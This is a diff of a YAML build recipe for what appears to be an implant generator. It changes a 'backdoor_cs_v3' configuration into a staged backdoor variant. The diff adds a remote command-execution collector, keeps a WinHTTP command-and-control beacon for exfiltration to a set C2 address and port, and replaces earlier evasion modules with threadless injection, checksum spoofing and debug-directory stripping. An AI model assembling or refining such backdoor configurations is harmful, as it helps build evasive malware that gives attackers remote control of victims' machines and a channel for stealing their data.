@@ -1,4 +1,4 @@
-name: backdoor_cs_v3
+name: backdoor_cs_staged_v1
 description: Auto-generated recipe by Hermes (c)
 core:
 - core/emit_buffer
@@ -6,13 +6,15 @@ core:
 - core/file_ops
 collectors:
 - core/emit_buffer
+- core/run_cmd
 exfil: c2/winhttp_beacon
-arch: arch/backdoor
+arch: arch/backdoor_staged
 resources: true
 api_resolve: api_resolve/api_hash_crc32
 evasion:
-- evasion/unhook_peruns_fart
-- evasion/etw_patch
+- evasion/threadless_inject
+- evasion/checksum_spoof
+- evasion/debug_dir_strip
 vars:
   C2_IP: 10.0.2.2
   C2_PORT: '9001'
